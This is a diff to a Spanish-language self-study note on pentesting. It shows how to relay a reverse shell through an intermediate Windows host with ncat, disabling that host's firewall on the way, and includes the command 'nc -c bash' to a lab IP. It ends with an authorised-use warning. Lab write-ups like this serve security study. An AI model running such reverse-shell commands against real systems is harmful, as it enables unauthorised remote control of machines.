@@ -1,3 +1,15 @@
+---
+title: "Reverse Shell ncat en Windows"
+date: 2026-08-27
+tags:
+  - self-study
+  - security-penetration-testing
+  - avanzado
+status: verified
+author: "Juan José Restrepo Rosero"
+last_updated: 2026-08-27
+---
+
 En windows, en vez de usar socat podemos usar ncat para permitir el tráfico de una reverse shell por parte de una máquina 3 pasando por una máquina windows intermedia. Por ejemplo, desde el Kali nos ponemos a la escucha:
 ![[Pasted image 20240303120530.png]]
 A continuación, en la máquina intermedia podemos desactivar el firewall para evitar tener problemas:
@@ -17,3 +29,10 @@ nc -c bash 10.10.10.129 1111
 ![[Pasted image 20240303120735.png]]
 Y recibimos la conexión:
 ![[Pasted image 20240303120747.png]]
+
+<!-- self-study-knowledge-context -->
+## Contexto de estudio
+- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
+- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
+> [!warning] Uso autorizado
+> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
